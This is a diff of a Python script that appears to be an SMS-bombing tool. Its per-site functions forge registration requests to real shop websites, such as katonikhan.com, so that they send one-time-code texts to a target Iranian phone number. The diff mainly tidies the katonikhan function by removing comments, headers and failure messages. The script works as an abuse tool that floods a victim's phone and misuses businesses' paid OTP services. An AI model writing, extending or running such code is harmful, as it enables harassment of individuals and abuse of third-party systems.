@@ -46,6 +46,7 @@ def check_internet():
 # ------------------------------
 # SMS services
 # ------------------------------
+
 def katonikhan(phone):
     import requests
     
@@ -62,18 +63,18 @@ def katonikhan(phone):
             "sms_otp": "",
             "otp_step_1": "1",
             "digits_otp_field": "1",
-            "instance_id": "f2cf6e724788dcfaacd48173e7215663",  # instance_id جدید
+            "instance_id": "f2cf6e724788dcfaacd48173e7215663",
             "optional_data": "optional_data",
             "action": "digits_forms_ajax",
             "type": "register",
-            "dig_otp": "otp",  # تغییر از "" به "otp"
+            "dig_otp": "otp",
             "digits": "1",
             "digits_redirect_page": "-1",
             "aio_special_field": "",
             "digits_form": "92e2d882a6",
             "_wp_http_referer": "/?login=true&page=1&redirect_to=https%3A%2F%2Fkatonikhan.com%2F",
-            "container": "digits_protected",  # اضافه شده
-            "sub_action": "sms_otp"  # اضافه شده
+            "container": "digits_protected",
+            "sub_action": "sms_otp"
         }
         
         headers = {
@@ -82,8 +83,6 @@ def katonikhan(phone):
             "X-Requested-With": "XMLHttpRequest",
             "Origin": "https://katonikhan.com",
             "Referer": "https://katonikhan.com/?login=true&page=1&redirect_to=https%3A%2F%2Fkatonikhan.com%2F",
-            "Accept": "*/*",
-            "Accept-Language": "en-US,en;q=0.9,fa;q=0.8"
         }
         
         response = requests.post(url, data=payload, headers=headers, timeout=10)
@@ -91,17 +90,13 @@ def katonikhan(phone):
         if response.status_code == 200:
             response_data = response.json()
             if response_data.get("success") is True:
-                print(f'{g}(katonikhan) {a}Code Sent to +98{digits_phone}')
+                print(f'{g}(katonikhan) {a}Code Sent')
                 return True
         
-        print(f'{r}[-] (katonikhan) Failed{a}')
         return False
             
     except Exception:
-        print(f'{r}[-] (katonikhan) Failed{a}')
         return False
-
-
 
 def katoonistore(phone):
     import requests
